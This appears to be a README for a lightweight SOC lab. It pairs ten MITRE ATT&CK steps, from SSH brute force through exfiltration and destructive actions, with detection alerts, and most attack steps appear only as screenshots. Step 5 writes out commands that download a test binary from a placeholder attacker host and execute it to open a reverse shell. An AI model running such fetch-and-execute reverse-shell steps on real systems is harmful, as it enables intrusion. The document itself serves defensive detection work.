# End-to-End Attack & Defense Scenario

This scenario demonstrates a full attack and defense cycle in the TinySOC lab.  
The attacker (Kali Linux) executes a sequence of MITRE ATT&CK techniques, while the defense stack (auditd, Suricata, ClamAV, Elastic Agent in standalone mode, and custom detection rules) detects and alerts on every action.

For each step, you will see:

- The attack command (run from Kali)
- The triggered alert in Telegram
- The corresponding log or alert in Kibana

---

## Scenario Structure

For each technique/rule:

1. **Attack Step (Kali Linux)**  
   - The exact command or action performed by the attacker.
2. **Alert Notification (Telegram)**  
   - Screenshot or text of the triggered alert.
3. **Log Review (Kibana)**  
   - Screenshot or example of the log/alert in Kibana.

---

## Example Steps

---

### 1. SSH Brute Force Attack

**Attack (Kali):**

<img width="1067" alt="image" src="https://github.com/user-attachments/assets/e396ad1a-03ee-4b40-8b90-44a356ab51ff" />

**Alert (Telegram):**

Alert from Auditd:

![Potential Internal Linux SSH Brute Force](https://github.com/user-attachments/assets/64171776-4591-4cf7-8c61-75125c90fed4)

Alert from Suricata:

![Potential Internal Linux SSH Brute Force (Suricata)](https://github.com/user-attachments/assets/7a73d054-6e41-4593-9505-a5d4905e3489) 

**Log (Kibana):**  

Auditd:

<img width="1233" alt="image" src="https://github.com/user-attachments/assets/fd6d4006-338b-4c06-8958-2bb71682236a" />

Suricata:

<img width="1228" alt="image" src="https://github.com/user-attachments/assets/10271fd2-12f3-45d5-acd6-8efff3d776a9" />


---

### 2. Sudo Heap-Based Buffer Overflow

**Attack (Kali):**

<img width="685" alt="image" src="https://github.com/user-attachments/assets/52f3fe1d-d2f4-4d8b-b20a-79118ac6b542" />

**Alert (Telegram):**

![Sudo Heap-Based Buffer Overflow](https://github.com/user-attachments/assets/5cd3fda0-e49d-4e23-869b-adfba6b2d9b2)

**Log (Kibana):**

<img width="1229" alt="image" src="https://github.com/user-attachments/assets/e5cc5bc6-a49d-4a48-8870-ebb16f52ab23" />

### 3. SUID/SGID Enumeration

**Attack (Kali):**

<img width="581" alt="image" src="https://github.com/user-attachments/assets/9f00e243-5522-424a-91f8-a23eb49cdcdf" />

**Alert (Telegram):**

![SUID_SGID Enumeration Detected!](https://github.com/user-attachments/assets/5cf1b3dc-666d-4ab9-ae9f-29b3efd7b463)

**Log (Kibana):**

<img width="646" alt="image" src="https://github.com/user-attachments/assets/d98f09b9-ceb6-4154-958f-f61f4d189770" />

### 4. Privilege Escalation via SUID/SGID

**Attack (Kali):**

<img width="1017" alt="image" src="https://github.com/user-attachments/assets/f891bc66-af27-419e-9628-a1a764a98cef" />

**Alert (Telegram):**

![Privilege Escalation via SUIDSGID](https://github.com/user-attachments/assets/71044845-36e7-4259-aff2-62e535a6f978)

**Log (Kibana):**

<img width="1233" alt="image" src="https://github.com/user-attachments/assets/9337d0ec-c4d8-4f2f-ac77-d140f8666cb3" />

## 5. Malware Download & Reverse Shell Execution

**Attack (Kali):**

Before launching the attack, I started an Apache server on Kali to host the EICAR test malware (eicar_elf). The victim machine downloads the file using wget, sets executable permissions, and executes it to establish a reverse shell.

On Kali (attacker):
```
sudo systemctl start apache2
```
Host the eicar_elf malware in the web server directory

![image](https://github.com/user-attachments/assets/d3ec548d-6c4b-4274-95df-21e0cbe5b697)

On victim (via compromised shell or after brute force):
```
wget http://<kali_ip>/eicar_elf
```
```
chmod +x eicar_elf
```

```
./eicar_elf  # Initiates reverse shell
```

<img width="1404" alt="image" src="https://github.com/user-attachments/assets/d7d922f2-aeb2-4f97-a169-da764b7891a9" />

<img width="623" alt="image" src="https://github.com/user-attachments/assets/e829966c-e213-4fe5-bb84-697a5a4e92b3" />

Start malware shell eicar_elf

<img width="295" alt="image" src="https://github.com/user-attachments/assets/5f2982a9-2128-41c2-ae1c-8e79c6e338cc" />

**Alert (Telegram):**

ClamAV:

![ClamAV Malware Detection Any Threat](https://github.com/user-attachments/assets/e9d89a38-2008-4f86-9051-880511bfb820)

![Execution ClamAV](https://github.com/user-attachments/assets/f2274012-a5c7-403c-b3bb-1f72ec05bdec)

Auditd:

![Potential Reverse Shell Detected!](https://github.com/user-attachments/assets/5b310221-eef8-4cf5-9f6d-8745562cd046)

Suricata:

![Suricata Alert Network Trojan Detected!](https://github.com/user-attachments/assets/6e5f82b7-2cf9-48ae-a1e7-0cf6c315221b)

**Log (Kibana):**

ClamAV:

<img width="1047" alt="image" src="https://github.com/user-attachments/assets/13658552-057d-429c-9540-df7047a287fd" />

Auditd:

<img width="701" alt="image" src="https://github.com/user-attachments/assets/84631a68-d31e-4bcb-af65-547d5e4f2a73" />

<img width="693" alt="image" src="https://github.com/user-attachments/assets/21c3628f-17ff-4f7b-8915-4f7534075503" />

<img width="1070" alt="image" src="https://github.com/user-attachments/assets/95c03a7e-0ece-4cf4-b376-94ef7554c7c0" />

Suricata:

<img width="711" alt="image" src="https://github.com/user-attachments/assets/c41e254c-1c9f-482c-914a-6f7105c713db" />

## 6. Persistence via Unauthorized User Creation

**Attack (Kali):**

<img width="600" alt="image" src="https://github.com/user-attachments/assets/a000eaff-544d-47c8-919e-9a0cfcf77480" />

**Alert (Telegram):**

![Persistance](https://github.com/user-attachments/assets/0ad009a8-5652-463f-bd1c-c4fcd5cb1cfc)

**Log (Kibana):**

<img width="686" alt="image" src="https://github.com/user-attachments/assets/02f19442-11f9-48fd-860a-686408b5d0ca" />

<img width="714" alt="image" src="https://github.com/user-attachments/assets/0176ce49-2e6a-423d-b4cd-4a407f4676f9" />

## 7. Sensitive Data Collection

**Attack (Kali):**

<img width="390" alt="image" src="https://github.com/user-attachments/assets/051ee164-b92e-44db-82e0-2dadbd89e06c" />

**Alert (Telegram):**

![Collection of Sensitive Data from Host](https://github.com/user-attachments/assets/89626752-4963-4f7e-a344-69abb360ed04)

**Log (Kibana):**

<img width="1043" alt="image" src="https://github.com/user-attachments/assets/14b85604-7d08-4473-8c9a-deac4bb80553" />

## 8. Data Exfiltration

**Attack (Kali):**

<img width="1439" alt="image" src="https://github.com/user-attachments/assets/47b23177-13ab-48e1-a38e-552a3c4c0a89" />

**Alert (Telegram):**

Auditd:

![Exfiltration of Sensitive Data Detected!](https://github.com/user-attachments/assets/db8c0d08-474b-470e-a067-26a4db8c70b8)

Suricata:

![Exfiltration of Sensitive Data (Suricata)](https://github.com/user-attachments/assets/40e97b03-2c4e-4a17-b3bb-179aeb6f070f)

**Log (Kibana):**

<img width="1095" alt="image" src="https://github.com/user-attachments/assets/2bdd9009-3f09-46d9-931a-703bf97ad65c" />

## 9. Trace Removal Attempt

**Attack (Kali):**

<img width="376" alt="image" src="https://github.com/user-attachments/assets/81e57c9b-05f5-4493-a4ce-4b7db8848d8e" />

**Alert (Telegram):**

![Trace Removal Attempt](https://github.com/user-attachments/assets/d6084e8f-2ac1-4c5b-997f-9187d9804480)

**Log (Kibana):**

<img width="954" alt="image" src="https://github.com/user-attachments/assets/de04cc63-176d-4bfd-b1fa-771fd5aabe99" />

## 10. Impact: Destructive Actions

**Attack (Kali):**

<img width="293" alt="image" src="https://github.com/user-attachments/assets/0493d760-65a7-4745-9974-be1a04d3dc82" />

**Alert (Telegram):**

![Impact: Destructive Actions](https://github.com/user-attachments/assets/12bfbaf0-cde0-4e84-b200-d97891ecc538)

**Log (Kibana):**

<img width="1022" alt="image" src="https://github.com/user-attachments/assets/400fa1a3-b92a-4783-a40d-458bc594aa02" />

## Conclusion

This end-to-end scenario demonstrates the effectiveness of a layered security approach in the TinySOC lab.  
At each stage of the attack-from initial access and privilege escalation to malware execution, persistence, data collection, exfiltration, trace removal, and destructive actions-every malicious technique was detected and alerted in real time.

**Key highlights:**
- **auditd** reliably captured critical system events such as privilege escalation, user creation, sensitive file access, and log tampering.
- **Suricata** provided deep visibility into network-based threats, including brute-force attempts, reverse shells, and data exfiltration.
- **ClamAV** ensured prompt malware detection at the file system level.
- **Elastic Agent (standalone)** efficiently collected and shipped all logs to Elasticsearch for centralized analysis.
- **Kibana** enabled rapid investigation and visualization of alerts and raw events.
- **Telegram integration** delivered instant notifications for immediate response.

Every attack technique was mapped to a detection rule, providing rich context for incident investigation and enabling timely response.  
This scenario proves that even a lightweight, resource-efficient SOC lab can deliver comprehensive detection and visibility across the entire MITRE ATT&CK chain-without the need for heavy components like Logstash or Fleet.

**Takeaways:**
- Open-source tools, thoughtfully integrated, can provide robust security monitoring and incident response.
- Real-time alerting and detailed log analysis empower analysts to detect, investigate, and respond to threats quickly.
- The modular, scenario-driven approach allows for easy extension and adaptation to new threats and techniques.

---

**Thank you for exploring the TinySOC Lightweight Lab!**
